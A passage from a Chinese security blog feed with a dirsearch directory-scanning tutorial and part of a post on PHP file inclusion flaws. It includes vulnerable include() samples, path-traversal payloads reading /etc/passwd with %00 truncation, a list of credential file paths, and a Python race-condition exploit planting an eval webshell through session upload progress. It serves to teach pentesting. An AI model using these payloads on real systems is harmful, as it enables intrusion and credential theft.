默认情况下，通过IP搜索速度请求。这将强制dirsearch按主机名请求</span><br><span class="line">    --ip=IP             服务器IP地址</span><br><span class="line">    --exit-on-error     每当发生错误时退出</span><br><span class="line"></span><br><span class="line">  Reports:</span><br><span class="line">    -o FILE, --output=FILE</span><br><span class="line">                        输出文件</span><br><span class="line">    --format=FORMAT     报告格式 (Available: simple, plain, json, xml,</span><br><span class="line">                        md, csv, html)</span><br></pre></td></tr></table></figure>
-
-<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>dirsearch 工具可以根据自己的需求进行配置，配置文件为 default.conf 。选择带 <code>#</code> 的进行配置。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># If you want to edit dirsearch default configurations, you can</span><br><span class="line"># edit values in this file. Everything after `#` is a comment</span><br><span class="line"># and won&#x27;t be applied</span><br><span class="line"></span><br><span class="line">[mandatory]</span><br><span class="line">default-extensions = php,aspx,jsp,html,js</span><br><span class="line">force-extensions = False</span><br><span class="line"># exclude-extensions = old,log</span><br><span class="line"></span><br><span class="line">[general]</span><br><span class="line">threads = 30</span><br><span class="line">recursive = False</span><br><span class="line">deep-recursive = False</span><br><span class="line">force-recursive = False</span><br><span class="line">recursion-depth = 0</span><br><span class="line">exclude-subdirs = %%ff/</span><br><span class="line">random-user-agents = False</span><br><span class="line">max-time = 0</span><br><span class="line">full-url = False</span><br><span class="line">quiet-mode = False</span><br><span class="line">color = True</span><br><span class="line">recursion-status = 200-399,401,403</span><br><span class="line"># include-status = 200-299,401</span><br><span class="line"># exclude-status = 400,500-999</span><br><span class="line"># exclude-sizes = 0b,123gb</span><br><span class="line"># exclude-texts = &quot;Not found&quot;</span><br><span class="line"># exclude-regexps = &quot;403 [a-z]&#123;1,25&#125;&quot;</span><br><span class="line"># exclude-content = 404.html</span><br><span class="line"># skip-on-status = 429,999</span><br><span class="line"></span><br><span class="line">[reports]</span><br><span class="line">report-format = plain</span><br><span class="line">autosave-report = True</span><br><span class="line"># report-output-folder = /home/user</span><br><span class="line"># logs-location = /tmp</span><br><span class="line">## Supported: plain, simple, json, xml, md, csv, html</span><br><span class="line"></span><br><span class="line">[dictionary]</span><br><span class="line">lowercase = False</span><br><span class="line">uppercase = False</span><br><span class="line">capitalization = False</span><br><span class="line"># prefixes = .,admin</span><br><span class="line"># suffixes = ~,.bak</span><br><span class="line"># wordlist = db/dicc.txt</span><br><span class="line"></span><br><span class="line">[request]</span><br><span class="line">httpmethod = get</span><br><span class="line">## Lowercase only</span><br><span class="line">follow-redirects = False</span><br><span class="line"># headers-file = headers.txt</span><br><span class="line"># user-agent = MyUserAgent</span><br><span class="line"># cookie = SESSIONID=123</span><br><span class="line"></span><br><span class="line">[connection]</span><br><span class="line">timeout = 5</span><br><span class="line">delay = 0</span><br><span class="line">scheme = http</span><br><span class="line">maxrate = 0</span><br><span class="line">retries = 2</span><br><span class="line">request-by-hostname = False</span><br><span class="line">exit-on-error = False</span><br><span class="line"># proxy = localhost:8080</span><br><span class="line"># proxy-list = proxies.txt</span><br><span class="line"># replay-proxy = localhost:8000</span><br></pre></td></tr></table></figure>
-
-<h1 id="命令-使用"><a href="#命令-使用" class="headerlink" title="命令-使用"></a>命令-使用</h1><h2 id="简单扫描"><a href="#简单扫描" class="headerlink" title="简单扫描"></a>简单扫描</h2><p>对 URL 进行扫描</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u https://target</span><br></pre></td></tr></table></figure>
-
-<p>扫描固定后缀文件的 URL</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target</span><br></pre></td></tr></table></figure>
-
-<p>定义字典扫描</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist</span><br></pre></td></tr></table></figure>
-
-<h2 id="暂停扫描"><a href="#暂停扫描" class="headerlink" title="暂停扫描"></a>暂停扫描</h2><p>dirsearch 允许您使用 CTRL+C 暂停扫描进度，从这里，您可以保存进度（稍后继续）、跳过当前目标或跳过当前子目录。</p>
-<p><img src="/2022/dirsearch/pause.png"></p>
-
-
-<h2 id="递归扫描"><a href="#递归扫描" class="headerlink" title="递归扫描"></a>递归扫描</h2><ul>
-<li>通过使用**-r | –recursive**参数，dirsearch 将递归地暴力破解所有目录。</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -r</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>您可以使用–recursion-depth</strong>设置最大递归深度，使用–recursion <strong>-</strong> status 设置递归状态码</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -r --recursion-depth 3 --recursion-status 200-399</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>还有 2 个选项：</p>
-<p><strong>–force-recursive</strong> 和 <strong>–deep-recursive</strong></p>
-<ul>
-<li><strong>强制递归</strong>：暴力递归所有找到的路径，而不仅仅是路径以<code>/</code></li>
-<li><strong>深度递归</strong>：递归暴力破解路径的所有深度（<code>a/b/c</code>&#x3D;&gt; 添加<code>a/</code>，<code>a/b/</code>）</li>
-</ul>
-</li>
-</ul>
-<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程号 ( <strong>-t | –threads</strong> ) 反映了分离的蛮力进程的数量。所以线程数越大，dirsearch 运行得越快。默认情况下，线程数为 30，但如果您想加快进度，可以增加它。</p>
-<p>速度仍然很大程度上取决于服务器的响应时间。如果你的线程过大可能导致Dos</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20</span><br></pre></td></tr></table></figure>
-
-<h2 id="前缀-x2F-后缀"><a href="#前缀-x2F-后缀" class="headerlink" title="前缀&#x2F;后缀"></a>前缀&#x2F;后缀</h2><p>自定义扫描文件前缀或者后缀</p>
-<ul>
-<li><strong>–prefixes</strong>：为所有条目添加自定义前缀</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --prefixes .,admin,_</span><br></pre></td></tr></table></figure>
-
-<p>例子</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tools</span><br><span class="line"></span><br><span class="line">生成</span><br><span class="line"></span><br><span class="line">.tools</span><br><span class="line">admintools</span><br><span class="line">_tools</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>–suffixes</strong>：为所有条目添加自定义后缀</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --suffixes ~</span><br></pre></td></tr></table></figure>
-
-<p>例子</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">internal</span><br><span class="line"></span><br><span class="line">生成</span><br><span class="line"></span><br><span class="line">index.php~</span><br><span class="line">internal~</span><br></pre></td></tr></table></figure>
-
-<h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><p>在<code>db/</code>文件夹内，有几个“黑名单文件”。如果这些文件中的路径与文件名中提到的状态相同，则将从扫描结果中过滤掉它们。</p>
-<p>示例：如果您添加<code>admin.php</code>到<code>db/403_blacklist.txt</code>，每当您执行<code>admin.php</code>返回 403 的扫描时，都会从结果中过滤掉。</p>
-<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>使用**-i | –include-status<strong>和</strong>-x | –exclude-status**选择允许和不允许的响应状态码</p>
-<p>对于更高级的过滤器：</p>
-<ul>
-<li><strong>–exclude-sizes</strong></li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-sizes 1B,243KB</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>–exclude-texts</strong></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-texts &quot;403 Forbidden&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>–exclude-regexps</strong></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-regexps &quot;^Error$&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>–exclude-redirects</strong></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-redirects &quot;https://(.*).okta.com/*&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>-exclude-content</strong></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-content /error.html</span><br></pre></td></tr></table></figure>
-
-<h2 id="原始请求"><a href="#原始请求" class="headerlink" title="原始请求"></a>原始请求</h2><p><strong>dirsearch</strong> 允许您从文件中导入原始请求。内容看起来像这样：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: admin.example.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>
-
-<h2 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h2><p>既然扫描网站，我们也可以选择使用 GET 或者 POST 方法</p>
-<p>但是在 post 方法中，POST 是万维网使用的 HTTP 支持的请求方法。POST 请求方法在设计上要求 Web 服务器接受包含在请求消息正文中的数据，最有可能存储它。它通常与 GET HTTP 方法一起使用，该方法在名称或值对中用于将表单数据附加到 URL。如果您使用 GET，则 URL 长度将受到限制。这使用户能够提交书签的结果。</p>
-<p>现在，我们正在使用此命令在 [-m] 参数的帮助下探索另一面。</p>
-<p>正如我们所知，与我们之前执行的 GET 请求方法相比，这些结果是不同且独特的。它显示了一些不同的网页和网页目录。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ -m POST</span><br></pre></td></tr></table></figure>
-
-<h2 id="延迟请求"><a href="#延迟请求" class="headerlink" title="延迟请求"></a>延迟请求</h2><p>根据规则，或者限制，延迟自己的请求，免除造成不必要的网络拥堵</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ -s 10</span><br></pre></td></tr></table></figure>
-
-<h2 id="词表格式"><a href="#词表格式" class="headerlink" title="词表格式"></a>词表格式</h2><p>支持的词表格式：大写、小写、大写</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小写</span><br><span class="line">admin</span><br><span class="line">index.html</span><br><span class="line">大写</span><br><span class="line">ADMIN</span><br><span class="line">INDEX.HTML</span><br><span class="line">首部</span><br><span class="line">Admin</span><br><span class="line">Index.html</span><br></pre></td></tr></table></figure>
-
-<h2 id="排除扩展"><a href="#排除扩展" class="headerlink" title="排除扩展"></a>排除扩展</h2><ul>
-<li>使用**-X | –exclude-extensions**带有扩展名列表将删除单词列表中包含给定扩展名的所有路径</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u https://target -X jsp</span><br></pre></td></tr></table></figure>
-
-<p>例子</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin.php</span><br><span class="line">test.jsp</span><br><span class="line"></span><br><span class="line">扫描后：</span><br><span class="line">admin.php</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>如果要排除所有扩展名，除了您在<code>-e</code>标志中选择的扩展名，请使用**–only-selected**</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e html -u https://target --only-selected</span><br></pre></td></tr></table></figure>
-
-<p>例子</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">index.html</span><br><span class="line">admin.php</span><br><span class="line">扫描后</span><br><span class="line">index.html</span><br></pre></td></tr></table></figure>
-
-<h2 id="扫描子目录"><a href="#扫描子目录" class="headerlink" title="扫描子目录"></a>扫描子目录</h2><ul>
-<li><strong>从 URL，您可以使用–subdirs</strong>扫描子目录列表。</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --subdirs admin/,folder/,/</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>它的反向版本是**–exclude-subdirs**，它可以防止 dirsearch 递归扫描给定的子目录。</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --recursive --exclude-subdirs image/,css/</span><br></pre></td></tr></table></figure>
-
-<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>dirsearch 支持 SOCKS 和 HTTP 代理，有两个选项：代理服务器或代理服务器列表。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxylist proxyservers.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="报告"><a href="#报告" class="headerlink" title="报告"></a>报告</h2><p>支持的报告格式：<strong>simple</strong>、<strong>plain</strong>、<strong>json</strong>、<strong>xml</strong>、<strong>md</strong>、<strong>csv</strong>、 <strong>html</strong></p>
-<p>将扫描变成报告输出出来</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -l URLs.txt --format plain -o report.txt</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --format html -o target.json</span><br></pre></td></tr></table></figure>
-
-<h2 id="没色扫描"><a href="#没色扫描" class="headerlink" title="没色扫描"></a>没色扫描</h2><p>扫描结果是没有颜色的，看个人喜好，毕竟有人喜欢花里胡哨</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ --no-color</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="扫描方法"><a href="#扫描方法" class="headerlink" title="扫描方法"></a>扫描方法</h2><ul>
-<li>服务器有请求限制？这很糟糕，但随意绕过它，通过随机代理<code>--proxy-list</code></li>
-<li>想要找出配置文件或备份？尝试<code>--suffixes ~</code>并<code>--prefixes .</code></li>
-<li>只想查找文件夹&#x2F;目录？为什么不结合<code>--remove-extensions</code>和<code>--suffixes /</code>！</li>
-<li>使用 CIDR 进行暴力破解时，混合使用<code>--cidr</code>、和 将减少大部分噪音 + 假阴性<code>-F``-q</code></li>
-<li>扫描 URL 列表，但不想看到 429 泛滥？<code>--skip-on-status 429</code>将帮助您在返回 429 时跳过目标</li>
-<li>服务器包含会减慢扫描速度的大文件？您<em>可能</em>想使用<code>HEAD</code>HTTP 方法而不是<code>GET</code></li>
-<li>蛮力 CIDR 很慢？可能您忘记减少请求超时和请求重试。建议:<code>--timeout 3 --retries 1</code></li>
-</ul>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含漏洞</title>
-    <url>/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含是指会在单个文件写入需要重复使用的函数，在需要使用的时候就直接调用此文件，这种文件调用的过程一般被称为文件包含。文件包含分为本地文件包含和远程文件包含，说明如下：</p>
-<ul>
-<li>当被包含的文件在服务器本地时，称为本地文件包含。</li>
-<li>当被包含的文件在第三方服务器时，称为远程文件包含。</li>
-</ul>
-<span id="more"></span>
-
-<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>由于开发人员没对文件名设置严格的规则，和其服务器上的没有过滤掉这些恶意文件，导致带有恶意代码的文件进入被包含进服务器中，从而形成了文件包含漏洞。</p>
-<h2 id="PHP中引发漏洞的函数"><a href="#PHP中引发漏洞的函数" class="headerlink" title="PHP中引发漏洞的函数"></a>PHP中引发漏洞的函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(): 表达式包含并运行指定文件</span><br><span class="line"><span class="keyword">include_once</span>(): 表达式包含并运行指定重复运行的文件</span><br><span class="line"><span class="keyword">require</span>():</span><br><span class="line"><span class="keyword">require_once</span>(): PHP会检查该文件是否已经被包含过，如果是则不会再次包含。</span><br></pre></td></tr></table></figure>
-
-<p>include() 函数在包含中出现错误，会警告一次，但是代码会继续运行，require() 函数它与 include 函数几乎一样，区别是它运行错误就会中止脚本。</p>
-<h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p><strong>类似代码</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="读取敏感信息"><a href="#读取敏感信息" class="headerlink" title="读取敏感信息"></a><strong>读取敏感信息</strong></h3><p>本地无限制读取，服务器没有过滤敏感信息。</p>
-<p><strong>Exp:</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p>常见敏感信息路径：路径也可能因为版本的更新而更改</p>
-<table>
-<thead>
-<tr>
-<th>Windows系统路径</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>c:\boot.ini</td>
-<td>查看系统版本</td>
-</tr>
-<tr>
-<td>c:\windows\system32\inetsrv\MetaBase.xml</td>
-<td>IIS配置文件</td>
-</tr>
-<tr>
-<td>c:\windows\repair\sam</td>
-<td>存储Windows系统初次安装的密码</td>
-</tr>
-<tr>
-<td>c:\ProgramFiles\mysql\my.ini</td>
-<td>MySQL配置</td>
-</tr>
-<tr>
-<td>c:\ProgramFiles\mysql\data\mysql\user.MYD</td>
-<td>MySQL root密码</td>
-</tr>
-<tr>
-<td>windows系统</td>
-<td>php 配置信息</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>Linux&#x2F;Unix系统路径</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&#x2F;etc&#x2F;passwd</td>
-<td>账户信息</td>
-</tr>
-<tr>
-<td>&#x2F;etc&#x2F;shadow</td>
-<td>账户密码文件</td>
-</tr>
-<tr>
-<td>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</td>
-<td>Apache2默认配置文件</td>
-</tr>
-<tr>
-<td>&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</td>
-<td>虚拟网站配置</td>
-</tr>
-<tr>
-<td>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini</td>
-<td>PHP相关配置</td>
-</tr>
-<tr>
-<td>&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</td>
-<td>Apache配置文件</td>
-</tr>
-<tr>
-<td>&#x2F;etc&#x2F;my.conf</td>
-<td>mysql 配置文件</td>
-</tr>
-</tbody></table>
-<h3 id="Session漏洞利用"><a href="#Session漏洞利用" class="headerlink" title="Session漏洞利用"></a>Session漏洞利用</h3><ul>
-<li><strong>php中的session.upload_progress</strong></li>
-</ul>
-<p>前提：php版本 &gt; php5.4</p>
-<p>在php.ini中有几个默认选项</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">on</span></span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">on</span></span><br><span class="line"><span class="attr">session.upload_progress.prefix</span> = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.name</span> = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.freq</span> = <span class="string">&quot;1%&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.min_freq</span> = <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">session.use_strict_mode</span>=<span class="literal">off</span></span><br></pre></td></tr></table></figure>
-
-<p>详解配置</p>
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">enabled=on表示upload<span class="built_in">_</span>progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</span><br><span class="line">cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</span><br><span class="line">name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span><br><span class="line">prefix+name将表示为session中的键名</span><br><span class="line">session.use<span class="built_in">_</span>strict<span class="built_in">_</span>mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控。</span><br></pre></td></tr></table></figure>
-
-<p>可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p>
-<ul>
-<li>前提：session 的存储位置可以获取</li>
-</ul>
-<p>通过phpinfo函数，读取session的存储位置，一般路径为：在session.save_path中有显示</p>
-<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20220305193427532.png"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20220305193427532.png" class title="This is an image">
-
-<ul>
-<li>条件竞争</li>
-</ul>
-<p>举个例子</p>
-<p>将包含漏洞的代码写入文件 session.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfs</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfs&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]=<span class="variable">$ctfs</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这个代码功能，通过 GET 将变量值读入到 session 中。</p>
-<p>首先需要通过传入变量，查看 Cookies 中的 PHPSESSID 的值，其内容就是文件名。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/session.php?ctfs=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>Exp：</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../var/lib/php/session文件名</span><br></pre></td></tr></table></figure>
-
-<p>通过上面写入的恶意代码，你访问文件名就可以执行了。</p>
-<p><strong>问题一</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果没有session_start(),如何创建session文件</span><br></pre></td></tr></table></figure>
-
-<p>解答：</p>
-<p>当session.auto_start&#x3D;on时，PHP在接受到请求后初始化Session，不用执行session_start（）。但是默认情况下，这个选项是不开启的。</p>
-<p>但是session中存在一个默认选项，<code>session.use_strict_mode=0</code>。表示用户可以自定义session的ID，例如，设置Cookie里的PHPSESSION&#x3D;FLAG，php就会在服务上创建一个文件：&#x2F;tmp&#x2F;sess_FLAG。虽然我们自己没有初始化，但是PHP也会自动初始化。并产生一个键值这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
-<p>漏洞利用脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">​</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://127.0.0.1:5555/test56.php&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">​</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h3><p><strong>%00截断</strong></p>
-<p>前提：<code>php.ini</code>中<code>magic_quotes_qpc=off</code>并且<code>PHP</code>版本&lt; 5.3.4的情况。</p>
-<p>漏洞代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>它会在你访问的文件中加上 html ，但是你可以通过截断来绕过它。</p>
-<p>Exp：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../../../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>
-
-<p><strong>长度绕过</strong></p>
-<p>前提：在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows下目录最大长度为256字节，超出的部分会被丢弃；</span><br><span class="line"></span><br><span class="line">Linux下目录最大长度为4096字节，超出的部分会被丢弃。</span><br></pre></td></tr></table></figure>
-
-<p><strong>漏洞代码</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Exp:</p>
